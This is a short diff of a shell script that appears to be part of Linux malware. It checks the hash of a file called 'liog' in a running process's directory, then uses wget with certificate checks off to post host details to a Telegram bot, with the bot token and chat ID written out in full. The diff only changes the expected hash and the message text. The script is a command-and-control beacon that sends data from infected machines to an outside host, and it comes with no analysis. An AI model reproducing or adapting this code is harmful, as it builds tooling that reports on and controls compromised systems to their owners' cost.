@@ -40,9 +40,9 @@ function hash() {
                 dir=$(pwdx $di|awk '{print $2}')
                 d=$dir"/""liog"
                 if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
-                        sum=$(md5sum $d|grep e110622f88718718664afc6873c61587|grep -v grep |wc -l)
+                        sum=$(md5sum $d|grep bd538fb57bfdaa144bf3857790a63204|grep -v grep |wc -l)
                         if [ $sum -eq 1 ]; then
-                                wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' run' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
+                                wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' found run' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                                 exit 0
                         else
 #                                cd /tmp
